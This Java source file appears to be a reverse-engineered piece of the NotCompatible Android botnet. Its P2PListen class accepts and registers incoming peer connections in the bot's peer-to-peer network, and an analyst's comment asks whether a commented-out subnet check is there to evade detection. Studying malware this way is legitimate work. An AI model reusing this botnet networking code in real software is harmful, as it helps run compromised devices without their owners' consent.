package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.SocketChannel;

import diff.notcompatible.c.bot.net.ThreadServer;

public class P2PListen extends TCPListen {
	
    private ThreadServer owner;

    public P2PListen(ThreadServer newOwner) {
        owner = newOwner;
        selector = owner.nio.selector;
    }

    public void onAccept(SelectionKey key) throws IOException {
        SocketChannel socketChannel = channel.accept();
        owner.portOpen();
        
        // Make sure we do not have a connection on this host address / port combo already and it is
        // no on the same subnet as any other node we already have (evade detection?)
        if (owner.p2plist.getByIpAndPort(socketChannel.socket().getInetAddress().getHostAddress(), socketChannel.socket().getPort()) == null) {// == null
        	//	&& owner.p2plist.checkSubnet(socketChannel.socket().getInetAddress().getHostAddress()))) {
            P2PLink p2pLink = new P2PLink(owner);
            p2pLink.init();
            p2pLink.isIncoming = true;
            p2pLink.channel = socketChannel;
            p2pLink.channel.configureBlocking(false);
            p2pLink.socketAddress = new InetSocketAddress(socketChannel.socket().getInetAddress().getHostAddress(), socketChannel.socket().getPort());
            p2pLink.selfKey = socketChannel.register(this.selector, 1);
            p2pLink.selfKey.attach(p2pLink);
            
            // Only a hub if we have too many connections already
            if (owner.p2plist.getConnections() > 20) {
                p2pLink.isOnlyHub = true;
            }
            
            p2pLink.lastUsedTime = System.currentTimeMillis();
            owner.p2plist.add(p2pLink);
        } else {
            socketChannel.close();
        }
    }

}
